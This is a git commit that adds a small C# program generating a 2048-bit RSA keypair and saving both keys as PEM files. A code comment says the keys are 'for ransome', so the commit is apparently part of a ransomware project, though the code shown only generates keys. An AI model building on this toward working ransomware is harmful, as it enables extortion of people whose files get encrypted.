6f755e6184a1a960c8503ae2e7b9ea2e732e234d
Galen-Dively <galen.dively4@gmail.com>
2026-03-19 14:07:59 -0400

    Added keygen

---
+++ keygen/Program.cs
@@ -0,0 +1,28 @@
+﻿// Program used to create keypair for ransome
+using System;
+using System.IO;
+using System.Security.Cryptography;
+
+
+RSA keys = RSA.Create(2048); // Size can be changed later just will be slower to encrypt
+
+string pubKey = keys.ExportRSAPublicKeyPem();
+string privKey = keys.ExportRSAPrivateKeyPem();
+
+string keyPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "keys");
+
+// Write public key
+using (StreamWriter pubKeyFile = new StreamWriter(Path.Combine(keyPath, "pub_key.pem")))
+{
+    pubKeyFile.Write(pubKey);
+}
+
+using (StreamWriter privKeyFile = new StreamWriter(Path.Combine(keyPath, "priv_key.pem")))
+{
+    privKeyFile.Write(privKey);
+}
+
+
+
+
+Console.WriteLine("Hello, World!");
